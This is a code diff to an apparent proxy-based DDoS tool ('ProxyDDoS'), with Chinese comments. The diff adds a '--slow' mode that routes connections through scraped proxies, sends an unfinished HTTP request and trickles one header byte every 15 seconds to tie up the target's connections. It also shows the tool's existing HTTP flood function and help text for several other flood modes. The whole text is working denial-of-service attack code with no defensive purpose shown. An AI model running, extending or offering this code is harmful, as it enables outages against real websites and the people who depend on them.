@@ -330,10 +330,45 @@ def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k
 def launchThreads():
     for _ in range(thr):
         try:
-            t = threading.Thread(target=send_requests)
+            if "--slow" in sys.argv:
+                t = threading.Thread(target=send_dsyn)
+            else:
+                t = threading.Thread(target=send_requests)
             t.start()
         except:
             pass
+
+
+def send_dsyn():
+    try:
+        proxy_ip, proxy_port = random.choice(good_proxies).split(":")
+        proxy_port = int(proxy_port)
+    except ValueError:
+        return
+    sema.acquire()
+    while 1:
+        try:
+            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
+            s.connect((host, port))
+            if port == 443:
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                s = context.wrap_socket(s, server_hostname=host)
+            try:
+                hd = 0
+                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-Alive\r\nSymbol: ".encode())
+                while 1:
+                    hd += 1
+                    s.send(f"{hd}".encode())
+                    time.sleep(15)
+            except:
+                s.close()
+        except:
+            s.close()                    
+    sema.release()
 
 
 def send_requests(): #傳統HTTP FLOOD
@@ -360,7 +395,7 @@ def send_requests(): #傳統HTTP FLOOD
                 s = context.wrap_socket(s, server_hostname=host)
             try:
                 for _ in range(100):
-                    s.send(f"{method} {path}?{rC(string)}={rInt(1,99999)}{rC(rand)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode('utf-8'))
+                    s.send(f"{method} {path}?{rC(string)}={rInt(1,99999)}{rC(rand)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode())
                 print(f"[ProxyDDoS]->Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
             except:
                 print(f"[ProxyDDoS]->Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
@@ -380,6 +415,7 @@ if __name__ == '__main__':
         print(" --pps    | Flood with no header")
         print(" --brute  | Flood with less header")
         print(" --cdn    | Flood with sec header")
+        print(" --slow   | Slow Connection Flood ")
         sys.exit()
     else:
         try:
@@ -402,6 +438,7 @@ if __name__ == '__main__':
                 thr = 800
             else:
                 thr = thr
+            sema = threading.Semaphore(thr)
             path = str(sys.argv[5])
             version = str(sys.argv[6])
         except Exception as e:
